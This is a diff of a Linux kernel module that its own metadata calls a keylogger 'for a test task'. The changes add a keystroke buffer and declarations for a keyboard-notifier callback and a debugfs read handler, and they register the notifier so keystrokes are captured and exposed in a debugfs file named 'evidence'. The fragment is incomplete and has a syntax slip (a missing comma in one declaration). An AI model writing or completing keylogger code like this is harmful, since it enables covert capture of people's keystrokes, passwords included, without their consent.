@@ -7,11 +7,25 @@
 #include <linux/moduleparam.h>
 #include <asm/io.h>
 
+#define BUF_LEN 1024
 
 MODULE_LICENSE("GPL v3");
 MODULE_AUTHOR("Ilia Kovalev, <ovceev@protonmail.com>");
 MODULE_VERSION("0.1 pre alpha beta gamma");
 MODULE_DESCRIPTION("Keylogger for a test task");
+
+static struct dentry *file;
+static size_t buf_pos;
+static char keys_buf[BUF_LEN];
+
+static ssize_t read(struct file *filp,
+		    char * buffer,
+		    size_t len,
+		    loff_t *offset);
+
+static int cb(struct notifier_block *nb
+		unsigned long action,
+		void *data);
 
 static const char *keymap[][2] = {
     {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},                   // 0-3
@@ -51,7 +65,6 @@ static const char *keymap[][2] = {
 
 
 const struct file_operations fops = {
-    .owner = THIS_MODULE,
     .read  = read,
 };
 
@@ -72,6 +85,8 @@ static int keylogger_init(void)
     file = debugfs_create_file("evidence", 0400, NULL, NULL, &fops);
     if (!file)
         return -ENOENT;
+        
+    register_keyboard_notifier(&nb);
     return 0;
 }
 
